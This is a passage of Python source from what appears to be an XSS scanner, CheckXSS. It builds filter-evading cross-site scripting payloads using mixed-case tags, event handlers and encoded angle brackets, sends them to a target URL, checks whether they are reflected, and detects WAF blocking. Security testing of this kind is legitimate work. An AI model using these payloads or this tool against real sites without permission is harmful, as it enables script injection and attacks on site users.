                    # if re.search(re.escape("details"), e1, re.IGNORECASE) and re.search(re.escape("ontoggle"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
                    #     payload.keyword['combination_close_yes'].append(
                    #         str592 + "<DeTaIlS" + "/" + "oNToGgle=" + urldata.unsensitive['action'][0] + ">")
                    #
                    # if re.search(re.escape("body"), e1, re.IGNORECASE) and re.search(re.escape("onload"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
                    #     payload.keyword['combination_close_yes'].append(
                    #         str592 + "<BoDy" + "/" + "oNLoAd=" + urldata.unsensitive['action'][0] + ">")

                    # if re.search(re.escape("svg"), e1, re.IGNORECASE) and re.search(re.escape("onload"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
                    #     payload.keyword['combination_close_yes'].append(
                    #         str592 + "<SvG" + "/" + "oNLoAd=" + urldata.unsensitive['action'][0] + ">")
                    #
                    # if re.search(re.escape("iframe"), e1, re.IGNORECASE) and re.search(re.escape("onload"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
                    #     payload.keyword['combination_close_yes'].append(
                    #         str592 + "<IfrAme" + "/" + "oNLoAd=" + urldata.unsensitive['action'][0] + ">")
                except:
                    pass

            if ">" not in "".join(urldata.black['close']) and "%3e" in "".join(urldata.black['close']):
                payload.keyword['combination_close_yes'] = format.payloadReplace(payload.keyword['combination_close_yes'], ">", "%3e")
            if "<" not in "".join(urldata.black['close']) and "%3c" in "".join(urldata.black['close']):
                payload.keyword['combination_close_yes'] = format.payloadReplace(payload.keyword['combination_close_yes'], "<", "%3c")
            if ">" not in "".join(urldata.black['close']) and "%3e" not in "".join(urldata.black['close']):
                payload.keyword['combination_close_yes'] = format.payloadReplace(payload.keyword['combination_close_yes'], ">", "%20")




            if len(payload.keyword['combination_close_yes']) == 0:
                # print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"无可用 Payload! ")
                print("\033[1;34m[" + str(time.strftime("%H:%M:%S",
                                                        time.localtime())) + "]\033[0m " + "\033[1;31m[INFO]\033[0m " + "No payload available " + "\n")
                return
            else:
                print("\033[1;34m[" + str(time.strftime("%H:%M:%S",
                                                        time.localtime())) + "]\033[0m " + "\033[1;33m[INFO]\033[0m " + "Finish generated "+str(len(payload.keyword['combination_close_yes']))+" payloads" + "\n")
                for erer in payload.keyword['combination_close_yes']:
                    print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"Payload: ",erer)
                print("\n\033[1;34m[" + str(
                    time.strftime("%H:%M:%S", time.localtime())) + "]\033[0m " + "Analysing reflections...")

            def startcheck(payload):
                if re.search(re.escape(urllib.parse.unquote(urllib.parse.unquote(payload))).replace("\ ", ".*"), PreCheck.responsebyurl(self, payload)):  # 使用 re.escape()
                    urldata.black['combination_close_yes'].append(payload)
                    print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"\033[1;32;8m[SUCCESS]：\033[0m" + payload)
                else:
                    if args.verbose: print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"[Failure]：", payload)
                    urldata.white['combination_close_yes'].append(payload)

            for p in payload.keyword['combination_close_yes']:
                mythread = threading.Thread(target=startcheck(p))
                mythread.start()


            return 

# waf checking

    def checkurlaccessibleInTheEnd(self):
        format.breakline()
        print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"WAF Status Checking...")
        while len(urldata.black['close']) < 1:
            return
        self.security_strategy = 0
        def startcheck(payload):
            if re.search(re.escape(urllib.parse.unquote(urllib.parse.unquote(payload))), PreCheck.responsebyurl(self, payload)):  # 使用 re.escape()
                pass
            else:
                self.security_strategy +=1
                if self.security_strategy > 1:
                    print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"\n"+'\033[1;32;8m[INFO] The existence of waf blocked the local IP, which may cause false positives! \033[0m')

        for i in urldata.black['close']:
            if self.security_strategy < 2:
                startcheck(i)
            else:
                pass
        if self.security_strategy < 2:
            print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"No detected WAF !")

        return

# ctrl 信号捕获函数
def exit_gracefully(signum, frame):
    signal.signal(signal.SIGINT, original_sigint)

    try:
        raw_input("\n\033[1;34;8m[!] pause! Press Enter to continue > \033[0m")

    except KeyboardInterrupt:
        print("\n\033[1;34;8m[!] Exiting... \033[0m")
        time.sleep(0.3)
        print("\n\033[1;34;8m[!] GoodBye！ \033[0m")
        os._exit(0)

    # restore the exit gracefully handler here
    signal.signal(signal.SIGINT, exit_gracefully)

if __name__ == "__main__":
    args = argsparse().args()
    print("======================================================================================\n"
     "CheckXSS v1.2.1 by Jewel591\n"
     "======================================================================================\n"
     " Url:       "," ".ljust(15), args.url,"\n"
     " Post DATA: "," ".ljust(15),args.postdata,"\n"
     " Parameter: "," ".rjust(15),args.parameter,"\n"
     " UserAgent: "," ".rjust(15),args.useragent,"\n"
     " Timeout:   "," ".rjust(15),args.timeout,"\n"
     " Verbose:   "," ".rjust(15), args.verbose, "\n"
     " Proxy:     "," ".rjust(15), args.proxy,"\n"
     "======================================================================================"
     )

    original_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, exit_gracefully)
    #*************************************************
    # if args.gui:
    #     app = QApplication(sys.argv)  # the standard way to init QT
    #     MyMainWindow().show()
    #     sys.exit(app.exec_())
    # else:
        # checkxss = WWWW()
    while True:
        Go()
